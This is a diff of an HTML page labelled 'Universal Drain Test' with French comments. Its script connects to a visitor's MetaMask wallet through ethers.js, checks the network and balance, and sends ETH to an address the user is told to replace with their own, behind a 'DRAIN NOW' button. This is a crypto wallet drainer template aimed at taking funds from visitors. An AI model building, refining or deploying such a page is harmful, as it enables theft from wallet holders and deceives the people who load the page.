@@ -2,56 +2,75 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>MetaMask Drain Test</title>
+  <title>Universal Drain Test</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f9f9f9;
+      background: #f4f4f4;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
     }
     button {
-      padding: 15px 30px;
-      font-size: 16px;
-      background: #ff6600;
+      padding: 14px 30px;
+      background-color: #0088ff;
       color: white;
+      font-size: 16px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <button onclick="startDrain()">🚨 Connect & Send ETH</button>
+  <button onclick="connectAndSend()">🚀 DRAIN NOW</button>
 
   <script>
-    async function startDrain() {
-      if (typeof window.ethereum === 'undefined') {
-        alert("MetaMask non détecté. Ouvre Firefox et installe MetaMask.");
+    async function connectAndSend() {
+      if (!window.ethereum) {
+        alert("MetaMask n'est pas détecté. Ouvre ce site dans Mozilla avec MetaMask.");
         return;
       }
 
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+
+      const signer = provider.getSigner();
+      const userAddress = await signer.getAddress();
+      console.log("Connecté à :", userAddress);
+
+      // Lire le réseau actif (Ethereum, BSC, Polygon, etc.)
+      const network = await provider.getNetwork();
+      console.log("Réseau:", network.name, "Chain ID:", network.chainId);
+
+      // Lire le solde de l'utilisateur
+      const balance = await provider.getBalance(userAddress);
+      const balanceInEth = ethers.utils.formatEther(balance);
+      console.log("Solde ETH:", balanceInEth);
+
+      // Vérifier qu'on a un minimum de 0.001 ETH pour le test
+      const minRequired = ethers.utils.parseEther("0.001");
+
+      if (balance.lt(minRequired)) {
+        alert("Solde insuffisant. Tu as seulement " + balanceInEth + " ETH.");
+        return;
+      }
+
+      // Préparer la transaction
+      const tx = {
+        to: "0x000000000000000000000000000000000000dEaD", // ← remplace par ton adresse
+        value: ethers.utils.parseEther("0.001")         // ← montant à envoyer
+      };
+
       try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
-        const address = await signer.getAddress();
-        console.log("Connecté à:", address);
-
-        const tx = {
-          to: "0x000000000000000000000000000000000000dead", // remplace par ton adresse
-          value: ethers.utils.parseEther("0.001")
-        };
-
-        const res = await signer.sendTransaction(tx);
-        console.log("Transaction envoyée:", res.hash);
-        alert("Transaction envoyée: " + res.hash);
-      } catch (error) {
-        console.error("Erreur:", error);
-        alert("Transaction annulée ou erreur.");
+        const result = await signer.sendTransaction(tx);
+        console.log("Transaction envoyée:", result.hash);
+        alert("✅ Transaction envoyée avec succès:\n" + result.hash);
+      } catch (err) {
+        console.error("Erreur:", err);
+        alert("❌ Transaction annulée ou erreur.");
       }
     }
   </script>
